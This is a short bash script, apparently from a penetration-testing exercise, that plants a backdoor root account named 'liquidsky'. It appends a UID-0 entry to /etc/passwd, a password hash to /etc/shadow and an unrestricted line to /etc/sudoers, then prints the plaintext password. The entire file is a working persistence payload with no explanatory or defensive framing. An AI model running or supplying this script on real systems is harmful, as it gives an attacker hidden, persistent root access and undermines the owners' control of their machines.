#!/bin/bash

echo "[*] Username: liquidsky"
echo "[*] Password: offsec1234"

echo 'liquidsky:x:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'liquidsky:$1$a6a731da$yuZSHEEzlDQxCnlAMJQ8U1:16902:0:99999:7:::' >> /etc/shadow
echo 'liquidsky ALL=(ALL) ALL' >> /etc/sudoers

echo "[*] OK."

